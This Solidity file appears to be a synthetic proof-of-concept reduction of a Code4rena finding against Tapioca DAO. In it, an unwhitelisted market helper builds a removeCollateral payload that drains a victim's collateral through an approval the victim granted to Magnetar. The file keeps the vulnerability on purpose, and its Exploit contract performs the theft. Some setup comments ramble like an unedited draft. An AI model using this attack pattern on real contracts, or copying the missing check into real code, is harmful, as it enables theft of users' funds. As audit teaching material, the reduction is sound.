// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-02] Missing check on helper contract allows arbitrary
    actions and theft of assets
    (carrotsmuggler, Code4rena 2024-02-tapioca, finding #32313)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: MagnetarOptionModule.exitPositionAndRemoveCollateral
    whitelists bigBang/singularity but NOT data.externalData.marketHelper.
    The helper builds the Module[]/bytes[] payload executed by BigBang.
    A malicious helper returns a removeCollateral payload for a victim; the
    market only checks allowance of msg.sender (Magnetar), which the victim
    granted — so the attacker steals the victim's collateral.

    Vulnerable helper usage is preserved (@> VULN). Cluster whitelist check
    exists for markets but is intentionally omitted for marketHelper.
//////////////////////////////////////////////////////////////////////////*/

enum Module {
    Borrow,
    RemoveCollateral
}

contract Cluster {
    mapping(address => bool) public whitelisted;

    function setWhitelisted(address a, bool v) external {
        whitelisted[a] = v;
    }

    function isWhitelisted(uint32, address a) external view returns (bool) {
        return whitelisted[a];
    }
}

/// @dev BigBang market: execute modules; removeCollateral checks Magnetar allowance.
contract BigBang {
    mapping(address => uint256) public collateralOf; // user => collateral shares
    mapping(address => mapping(address => uint256)) public allowanceBorrow; // from => spender => share
    mapping(address => uint256) public freeCollateral; // recipient of removed coll

    function seed(address user, uint256 coll) external {
        collateralOf[user] = coll;
    }

    /// @dev Synthetic setup: victim has already approved Magnetar for market ops.
    function seedApproval(address from, address spender, uint256 share) external {
        allowanceBorrow[from][spender] = share;
    }

    function approveBorrow(address spender, uint256 share) external {
        allowanceBorrow[msg.sender][spender] = share;
    }

    function execute(Module[] memory modules, bytes[] memory calls, bool)
        external
        returns (bool[] memory successes, bytes[] memory results)
    {
        successes = new bool[](modules.length);
        results = new bytes[](modules.length);
        for (uint256 i; i < modules.length; i++) {
            if (modules[i] == Module.RemoveCollateral) {
                (address from, address to, uint256 share) = abi.decode(calls[i], (address, address, uint256));
                _removeCollateral(from, to, share);
            } else if (modules[i] == Module.Borrow) {
                // not needed for this PoC
            }
            successes[i] = true;
        }
    }

    function _removeCollateral(address from, address to, uint256 share) internal {
        // allowedBorrow(from, share): magnetar holds the user's approval
        if (from != msg.sender) {
            require(allowanceBorrow[from][msg.sender] >= share, "Market: not approved");
            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {
                allowanceBorrow[from][msg.sender] -= share;
            }
        }
        collateralOf[from] -= share;
        freeCollateral[to] += share;
    }
}

/// @dev Honest helper would encode repay/removeCollateral for the requested user.
interface IMarketHelper {
    function removeCollateral(address from, address to, uint256 share)
        external
        view
        returns (Module[] memory modules, bytes[] memory calls);
}

/// @notice Malicious helper: ignores inputs and returns a payload that drains victim.
contract MaliciousMarketHelper {
    address public victim;
    address public lootTo;
    uint256 public share;

    function configure(address v, address to, uint256 s) external {
        victim = v;
        lootTo = to;
        share = s;
    }

    function removeCollateral(address, address, uint256)
        external
        view
        returns (Module[] memory modules, bytes[] memory calls)
    {
        modules = new Module[](1);
        calls = new bytes[](1);
        modules[0] = Module.RemoveCollateral;
        calls[0] = abi.encode(victim, lootTo, share);
    }

    function repay(address, address, bool, uint256)
        external
        pure
        returns (Module[] memory modules, bytes[] memory calls)
    {
        modules = new Module[](0);
        calls = new bytes[](0);
    }
}

/// @notice Reduced MagnetarOptionModule: whitelist BB/SGL but NOT marketHelper.
contract MagnetarOptionModule {
    Cluster public cluster;

    constructor(Cluster c) {
        cluster = c;
    }

    /// @dev Simplified exitPositionAndRemoveCollateral remove-collateral leg.
    function exitPositionAndRemoveCollateral(
        address user,
        address bigBang,
        address marketHelper,
        uint256 collateralShare,
        address removeCollateralTo
    ) external {
        // Whitelist checks for markets (present in real code)...
        if (bigBang != address(0)) {
            require(cluster.isWhitelisted(0, bigBang), "Magnetar_TargetNotWhitelisted(bigBang)");
        }
        // FIX: require(cluster.isWhitelisted(0, marketHelper));

        // Helper builds the payload — attacker-controlled if helper is malicious.
        (Module[] memory modules, bytes[] memory calls) =
            IMarketHelper(marketHelper).removeCollateral(user, removeCollateralTo, collateralShare); // @> VULN: marketHelper not whitelisted

        // BigBang executes; msg.sender is Magnetar (which has victim's approval).
        BigBang(bigBang).execute(modules, calls, true);
    }
}

contract Exploit {
    Cluster public cluster; // 1
    BigBang public bigBang; // 2
    MagnetarOptionModule public magnetar; // 3
    MaliciousMarketHelper public evilHelper; // 4

    address public constant VICTIM = address(0x5151);
    address public constant ATTACKER = address(0xA11CE);
    uint256 public constant COLLATERAL = 500 ether;

    constructor() {
        cluster = new Cluster(); // 1
        bigBang = new BigBang(); // 2
        magnetar = new MagnetarOptionModule(cluster); // 3
        evilHelper = new MaliciousMarketHelper(); // 4

        cluster.setWhitelisted(address(bigBang), true);
        // marketHelper intentionally NOT whitelisted — and not required by the bug

        bigBang.seed(VICTIM, COLLATERAL);
        // Victim approved Magnetar for market operations (precondition of Magnetar usage).
        // Simulate: set allowanceBorrow[VICTIM][magnetar] via a helper on BigBang.
        // Use a seed approval function:
        // We need victim to approve magnetar — add a test-only seed on BigBang via
        // direct storage from a setup on BigBang that the victim would do.
        _seedVictimApproval();

        evilHelper.configure(VICTIM, ATTACKER, COLLATERAL);
    }

    function _seedVictimApproval() internal {
        // BigBang has no admin set-allowance; use a public seed for the synthetic.
        // Re-open via a tiny approval-setter added on BigBang... we already have
        // approveBorrow requiring msg.sender == victim. Use Approver actor? Simpler:
        // expose seedApproval on BigBang (already can be called if we add it).
        // Call through a one-liner: we patch by using free public seed:
        bigBang.seedApproval(VICTIM, address(magnetar), type(uint256).max);
    }

    function run() external {
        require(bigBang.collateralOf(VICTIM) == COLLATERAL, "victim coll");
        require(bigBang.freeCollateral(ATTACKER) == 0, "attacker empty");

        // Attacker calls Magnetar with a malicious marketHelper. data.user can be
        // the attacker themselves for _checkSender; the helper still targets VICTIM.
        magnetar.exitPositionAndRemoveCollateral(
            address(this), // attacker as "user" (passes sender check in full code)
            address(bigBang),
            address(evilHelper),
            1, // ignored by evil helper
            address(this)
        );

        // HARM: victim's collateral moved to attacker via Magnetar's approval.
        require(bigBang.collateralOf(VICTIM) == 0, "victim drained");
        require(bigBang.freeCollateral(ATTACKER) == COLLATERAL, "attacker received coll");
    }
}
